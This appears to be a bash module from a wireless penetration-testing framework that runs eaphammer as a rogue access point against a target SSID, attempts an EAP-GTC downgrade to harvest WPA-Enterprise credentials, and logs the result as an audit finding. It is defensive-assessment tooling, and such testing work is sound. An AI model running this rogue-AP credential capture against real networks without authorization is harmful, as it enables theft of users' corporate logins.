#!/usr/bin/env bash
# MODULE_META
# NAME="WPA-Enterprise / EAP Attack"
# CATEGORY="D"
# DEPS="A1"
# CRITICAL="no"
# TOOLS="eaphammer"
# DESC="Test for EAP-level vulnerabilities (GTC downgrade, certificate validation bypass)"
# REQS="monitor_iface,target_ssid"
# PCAP="yes"
# DECODE="eap"

#===============================================================================
#  modules/d5_eap_attack.sh
#  D5: WPA-Enterprise / EAP Attack (Golden Wrapper)
#===============================================================================

set -euo pipefail

# Inputs from Environment
INTERFACE="${MONITOR_INTERFACE:-}"
SSID="${GUEST_SSID:-}"
SESSION_DIR="${SESSION_DIR:-.}"
EVIDENCE_DIR="${SESSION_EVIDENCE_DIR:-${SESSION_DIR}/evidence}"
ASTRA_BIN="${ASTRA_BIN:-wifi-astra}"
TC_ID="D5"
EAP_OUT="${EVIDENCE_DIR}/${TC_ID}_eaphammer_results.txt"

if [[ -z "$INTERFACE" ]]; then
    echo "[!] MONITOR_INTERFACE not set."
    exit 1
fi

if [[ -z "$SSID" ]]; then
    echo "[!] GUEST_SSID not set. EAP testing requires a target SSID."
    exit 1
fi

echo "[*] Starting WPA-Enterprise / EAP tests against ${SSID}..."

# Use eaphammer if available
if command -v eaphammer &>/dev/null; then
    echo "[*] Running eaphammer GTC downgrade attempt (60s)..."
    # Launch rogue AP and wait for connections
    # Note: eaphammer might require specific configuration or certs
    timeout 60 eaphammer --interface "$INTERFACE" --essid "$SSID" --negotiate gtc --auth wpa2-aes > "$EAP_OUT" 2>&1 || true
    
    # Robust parsing for captured credentials
    if awk 'tolower($0) ~ /captured|credential|password|hash/ {exit 0} END {exit 1}' "$EAP_OUT"; then
        echo "[!] SUCCESS: EAP CREDENTIALS CAPTURED!"
        "$ASTRA_BIN" record-finding \
            --session-dir "$SESSION_DIR" \
            --tc "$TC_ID" \
            --type vulnerability \
            --name "EAP Credential Captured" \
            --desc "Successfully captured WPA-Enterprise credentials via EAP-GTC downgrade or MSCHAPv2 interception against SSID ${SSID}." \
            --severity CRITICAL \
            --evidence "$EAP_OUT" \
            --rationale "Capturing EAP credentials (usernames and hashes/passwords) allows for unauthorized access to corporate networks. GTC downgrade attacks exploit clients that do not strictly enforce secure EAP types or certificate validation."
    else
        echo "[+] EAP attack complete. No immediate credentials captured."
        "$ASTRA_BIN" record-finding \
            --session-dir "$SESSION_DIR" \
            --tc "$TC_ID" \
            --type vulnerability \
            --name "[$TC_ID] Audit Complete" \
            --desc "Executed EAP-GTC downgrade attack against SSID ${SSID}. No client credentials were intercepted during the 60-second window." \
            --severity INFO \
            --evidence "$EAP_OUT" \
            --rationale "WPA-Enterprise attacks require an active client to connect to the rogue AP and attempt authentication. The lack of captures indicates either no vulnerable clients were present or client-side certificate validation is correctly enforced."
    fi
else
    echo "[!] eaphammer tool not found. This module requires eaphammer for WPA-Enterprise testing."
    "$ASTRA_BIN" record-finding \
        --session-dir "$SESSION_DIR" \
        --tc "$TC_ID" \
        --type vulnerability \
        --name "[$TC_ID] Audit Skipped" \
        --desc "The eaphammer tool is missing from the system. Unable to perform WPA-Enterprise/EAP attacks." \
        --severity INFO \
        --evidence "$EVIDENCE_DIR" \
        --rationale "Enterprise-grade testing requires specialized tools like eaphammer to simulate complex authentication flows and rogue AP scenarios."
    exit 0
fi

exit 0
